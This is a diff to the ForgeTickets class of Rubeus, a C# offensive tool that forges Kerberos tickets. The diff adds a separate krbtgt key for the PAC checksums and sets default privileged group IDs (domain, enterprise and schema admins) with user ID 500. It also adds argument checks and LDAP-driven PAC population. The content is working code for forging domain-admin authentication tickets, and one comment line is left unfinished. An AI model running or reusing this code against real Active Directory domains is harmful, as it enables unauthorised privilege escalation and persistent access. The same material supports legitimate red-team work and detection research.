@@ -11,21 +11,41 @@ namespace Rubeus
 {
     public class ForgeTickets
     {
-        public static void ForgeTicket(string user, string sname, string keyString, Interop.KERB_ETYPE etype, bool fromldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 500, string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
+        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, byte[] krbKey = null, bool fromldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 0, string groups = "", string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
         {
             // vars
             int c = 0;
 
-            // initialise LogonInfo section and set some defaults
+            // initialise LogonInfo section and set defaults
             var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
             kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(user);
+            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
+            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
+            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
+            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
+            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
+            kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");
             kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
-            kvi.LogonTime = Ndr._FILETIME.CreateDefault();
+            kvi.LogonTime = new Ndr._FILETIME(DateTime.UtcNow);
             kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
             kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
             kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
             kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
             kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
+            kvi.LogonCount = 0;
+            kvi.BadPasswordCount = 0;
+            kvi.UserId = 500;
+            if (string.IsNullOrEmpty(groups))
+            {
+                kvi.GroupCount = 5;
+                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[] {
+                    new Ndr._GROUP_MEMBERSHIP(520, 0),
+                    new Ndr._GROUP_MEMBERSHIP(512, 0),
+                    new Ndr._GROUP_MEMBERSHIP(513, 0),
+                    new Ndr._GROUP_MEMBERSHIP(519, 0),
+                    new Ndr._GROUP_MEMBERSHIP(518, 0),
+                };
+            }
             kvi.UserAccountControl = 528;
             kvi.UserFlags = 32;
             if (String.IsNullOrEmpty(sids))
@@ -35,6 +55,8 @@ namespace Rubeus
                         new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
             }
 
+            // Some 
+
 
             // determine domain if not supplied
             string[] parts = sname.Split('/');
@@ -42,7 +64,7 @@ namespace Rubeus
             {
                 if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                 {
-                    Console.WriteLine("[X] Referral TGT requires /domain to be passed.");
+                    Console.WriteLine("[X] TGT or referral TGT requires /domain to be passed.");
                     return;
                 }
                 else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
@@ -70,7 +92,7 @@ namespace Rubeus
                 }
             }
 
-            // if /fromldap was passed make the LDAP query
+            // if /fromldap was passed make the LDAP queries
             if (fromldap)
             {
                 DirectoryEntry directoryObject = null;
@@ -127,14 +149,11 @@ namespace Rubeus
 
                     foreach (SearchResult u in users)
                     {
+                        // set account data from object attributes
                         domainDN = u.Properties["distinguishedname"][0].ToString().Substring(u.Properties["distinguishedname"][0].ToString().IndexOf("DC="));
                         if (u.Properties["homedirectory"].Count > 0)
                         {
                             kvi.FullName = new Ndr._RPC_UNICODE_STRING(u.Properties["displayname"][0].ToString());
-                        }
-                        else
-                        {
-                            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
                         }
                         string objectSid = (new SecurityIdentifier((byte[])u.Properties["objectsid"][0], 0)).Value;
                         string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
@@ -158,38 +177,21 @@ namespace Rubeus
                         }
                         kvi.PrimaryGroupId = (int)u.Properties["primarygroupid"][0];
                         kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-')+1));
-                        kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                         if (u.Properties["homedirectory"].Count > 0)
                         {
                             kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(u.Properties["homedirectory"][0].ToString());
-                        }
-                        else
-                        {
-                            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
                         }
                         if (u.Properties["homedrive"].Count > 0)
                         {
                             kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(u.Properties["homedrive"][0].ToString());
                         }
-                        else
-                        {
-                            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
-                        }
                         if (u.Properties["profilepath"].Count > 0)
                         {
                             kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["profilepath"][0].ToString());
                         }
-                        else
-                        {
-                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
-                        }
                         if (u.Properties["scriptpath"].Count > 0)
                         {
                             kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(u.Properties["scriptpath"][0].ToString());
-                        }
-                        else
-                        {
-                            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
                         }
 
                         kvi.GroupCount = u.Properties["memberof"].Count;
@@ -197,6 +199,7 @@ namespace Rubeus
                         c = 0;
                         if (u.Properties["memberof"].Count > 0)
                         {
+                            // build the group membership search filter and reuse the usersearcher object
                             try
                             {
                                 string groupSearchFilter = "";
@@ -214,15 +217,16 @@ namespace Rubeus
 
                             try
                             {
-                                SearchResultCollection groups = userSearcher.FindAll();
+                                SearchResultCollection returnedGroups = userSearcher.FindAll();
 
-                                if (groups.Count == 0)
+                                if (returnedGroups.Count == 0)
                                 {
                                     Console.WriteLine("[X] No groups returned by LDAP!");
                                     return;
                                 }
 
-                                foreach (SearchResult g in groups)
+                                // set the GroupIds field in the PAC from the group SIDs returned from LDAP
+                                foreach (SearchResult g in returnedGroups)
                                 {
                                     string groupSid = (new SecurityIdentifier((byte[])g.Properties["objectsid"][0], 0)).Value;
                                     int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
@@ -244,6 +248,7 @@ namespace Rubeus
                             }
                         }
 
+                        // Search for the NETBIOS name in LDAP if it isn't passed on the command line
                         if (String.IsNullOrEmpty(netbiosName))
                         {
                             try
@@ -279,10 +284,6 @@ namespace Rubeus
                                 return;
                             }
                         }
-
-                        /*Console.WriteLine("[*] SamAccountName         : {0}", u.Properties["samAccountName"][0].ToString());
-                        Console.WriteLine("[*] Domain SID             : {0}", domainSid);
-                        Console.WriteLine("[*] Last Logon             : {0}", DateTime.FromFileTime((long)u.Properties["lastlogon"][0]));*/
                     }
                 }
                 catch (Exception ex)
@@ -299,6 +300,11 @@ namespace Rubeus
                 }
 
             }
+            else if (String.IsNullOrEmpty(netbiosName) || String.IsNullOrEmpty(sid))
+            {
+                Console.WriteLine("[X] To forge tickets without specifying '/fromldap' both '/netbios' and '/sid' are required.");
+                return;
+            }
 
             // initialize some structures
             KRB_CRED cred = new KRB_CRED();
@@ -313,6 +319,25 @@ namespace Rubeus
             {
                 kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(sid));
             }
+            if (!String.IsNullOrEmpty(groups))
+            {
+                int numOfGroups = groups.Split(',').Length;
+                kvi.GroupCount = numOfGroups;
+                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[numOfGroups];
+                c = 0;
+                foreach (string gid in groups.Split(','))
+                {
+                    try
+                    {
+                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(Int32.Parse(gid), 7) }, 0, kvi.GroupIds, c, 1);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("[X] Error unable to parse group id {0}: {1}", gid, e.Message);
+                    }
+                    c += 1;
+                }
+            }
             if (!String.IsNullOrEmpty(sids))
             {
                 int numOfSids = sids.Split(',').Length;
@@ -323,6 +348,14 @@ namespace Rubeus
                 {
                     Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, c, 1);
                     c += 1;
+                }
+            }
+            if (!String.IsNullOrEmpty(domainController))
+            {
+                string dcName = Networking.GetDCNameFromIP(domainController);
+                if (dcName != null)
+                {
+                    kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                 }
             }
             LogonInfo li = new LogonInfo(kvi);
@@ -367,8 +400,11 @@ namespace Rubeus
             Array.Clear(svrSigData.Signature, 0, sigLength);
             Array.Clear(kdcSigData.Signature, 0, sigLength);
 
-            // get the key from keyString
-            byte[] key = Helpers.StringToByteArray(keyString);
+            // set krbKey to serviceKey if none is given
+            if (krbKey == null)
+            {
+                krbKey = serviceKey;
+            }
 
             // add sections to the PAC, get bytes and generate checksums
             List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
@@ -379,8 +415,8 @@ namespace Rubeus
             PacInfoBuffers.Add(kdcSigData);
             PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
             byte[] ptBytes = pt.Encode();
-            byte[] svrSig = Crypto.KerberosChecksum(key, ptBytes, svrSigData.SignatureType);
-            byte[] kdcSig = Crypto.KerberosChecksum(key, svrSig, kdcSigData.SignatureType);
+            byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
+            byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);
 
             // add checksums
             svrSigData.Signature = svrSig;
@@ -399,7 +435,7 @@ namespace Rubeus
 
             // encrypt the EncTicketPart
             byte[] encTicketData = decTicketPart.Encode().Encode();
-            byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
+            byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);
 
             // initialize the ticket and add the enc_part
             Ticket ticket = new Ticket(domain.ToUpper(), sname);
